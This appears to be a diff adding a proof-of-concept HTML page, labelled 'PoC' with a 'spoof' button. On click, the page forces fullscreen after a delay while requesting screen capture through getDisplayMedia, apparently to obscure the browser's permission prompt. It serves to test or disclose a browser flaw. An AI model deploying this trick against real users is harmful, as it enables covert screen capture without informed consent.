@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <title>PoC</title>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+        <script>
+			async function requestScreenShare() {
+			setTimeout("document.body.requestFullscreen();",500);
+				try {
+                    let captureStream = await navigator.mediaDevices.getDisplayMedia();
+                    console.log('Captured stream:', captureStream);
+                } catch (err) {
+                    console.error(`Error: ${err}`);
+                }
+                
+            }
+        </script>
+    </head>  
+    <body>
+        <br><br><br>
+        <center>
+            <button onclick="requestScreenShare()">spoof</button>
+        </center>
+    </body>
+  </body>
+</html>
